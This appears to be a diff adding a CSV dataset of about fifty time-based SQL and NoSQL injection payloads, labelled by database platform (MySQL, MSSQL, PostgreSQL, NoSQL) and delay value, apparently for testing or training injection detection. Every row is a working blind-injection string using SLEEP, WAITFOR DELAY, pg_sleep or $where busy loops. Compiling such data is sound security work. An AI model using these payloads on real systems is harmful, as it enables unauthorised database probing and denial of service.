@@ -1,0 +1,51 @@
+Query,platform,base_type,original_id,transform_type,delay_value,obfuscation
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(1) END) --,PostgreSQL,direct_time,611,time-based-none,1,none
+1; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,435,time-based-none,10,none
+"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,669,nosql-time,10,none
+'; IF (1=1) WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,369,time-based-none,7,none
+'; IF (1=1) WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,336,time-based-none,1,none
+'; IF (1=1) WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,380,time-based-none,10,none
+1 OR SLEEP(1),MySQL,direct_time,171,time-based-none,1,none
+'; SELECT pg_sleep(7); --,PostgreSQL,direct_time,534,time-based-none,7,none
+"' AND IF(1=1, SLEEP(10), 0) -- ",MySQL,direct_time,270,time-based-none,10,none
+'; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,325,time-based-none,10,none
+'; SELECT pg_sleep(10); --,PostgreSQL,direct_time,545,time-based-none,10,none
+1 OR SLEEP(5),MySQL,direct_time,193,time-based-none,5,none
+'; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,303,time-based-none,5,none
+'; SLEEP(10); -- ,MySQL,direct_time,50,time-based-none,10,none
+"{""$where"": ""for(i=0;i<1e9;i++){{}}; return true; ""}",NoSQL,nosql_time,677,nosql-time,5,none
+'; SLEEP(1); -- ,MySQL,direct_time,6,time-based-none,1,none
+' AND SLEEP(1) -- ,MySQL,direct_time,61,time-based-none,1,none
+'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,446,time-based-none,1,none
+'; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,292,time-based-none,3,none
+' AND SLEEP(3) -- ,MySQL,direct_time,72,time-based-none,3,none
+' OR pg_sleep(1) --,PostgreSQL,direct_time,556,time-based-none,1,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) END) --,PostgreSQL,direct_time,655,time-based-none,10,none
+' AND SLEEP(10) -- ,MySQL,direct_time,105,time-based-none,10,none
+'; SELECT pg_sleep(1); --,PostgreSQL,direct_time,501,time-based-none,1,none
+1 OR SLEEP(10),MySQL,direct_time,215,time-based-none,10,none
+'; SELECT pg_sleep(3); --,PostgreSQL,direct_time,512,time-based-none,3,none
+"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 5000){}; return true; }"" }",NoSQL,nosql_time,662,nosql-time,5,none
+1 OR SLEEP(7),MySQL,direct_time,204,time-based-none,7,none
+"{""$where"": ""for(i=0;i<1e14;i++){{}}; return true; ""}",NoSQL,nosql_time,679,nosql-time,10,none
+"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 1000){}; return true; }"" }",NoSQL,nosql_time,660,nosql-time,1,none
+1; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,413,time-based-none,5,none
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(7) END) --,PostgreSQL,direct_time,644,time-based-none,7,none
+' AND SLEEP(7) -- ,MySQL,direct_time,94,time-based-none,7,none
+' OR pg_sleep(3) --,PostgreSQL,direct_time,567,time-based-none,3,none
+'; IF (1=1) WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,347,time-based-none,3,none
+'; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,281,time-based-none,1,none
+' OR SLEEP(3)#,MySQL,direct_time,127,time-based-none,3,none
+"{""$where"": ""sleep(3)""}",NoSQL,nosql_time,671,nosql-time,3,none
+'; SLEEP(3); -- ,MySQL,direct_time,17,time-based-none,3,none
+'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,457,time-based-none,3,none
+' AND SLEEP(5) -- ,MySQL,direct_time,83,time-based-none,5,none
+"' AND IF(1=1, SLEEP(3), 0) -- ",MySQL,direct_time,237,time-based-none,3,none
+"' AND IF(1=1, SLEEP(7), 0) -- ",MySQL,direct_time,259,time-based-none,7,none
+'; SELECT pg_sleep(5); --,PostgreSQL,direct_time,523,time-based-none,5,none
+"' AND IF(1=1, SLEEP(5), 0) -- ",MySQL,direct_time,248,time-based-none,5,none
+1; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,391,time-based-none,1,none
+"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 10000){}; return true; }"" }",NoSQL,nosql_time,664,nosql-time,10,none
+"{""$where"": ""for(i=0;i<1e5;i++){{}}; return true; ""}",NoSQL,nosql_time,675,nosql-time,1,none
+' OR pg_sleep(7) --,PostgreSQL,direct_time,589,time-based-none,7,none
+"' AND IF(1=1, SLEEP(1), 0) -- ",MySQL,direct_time,226,time-based-none,1,none
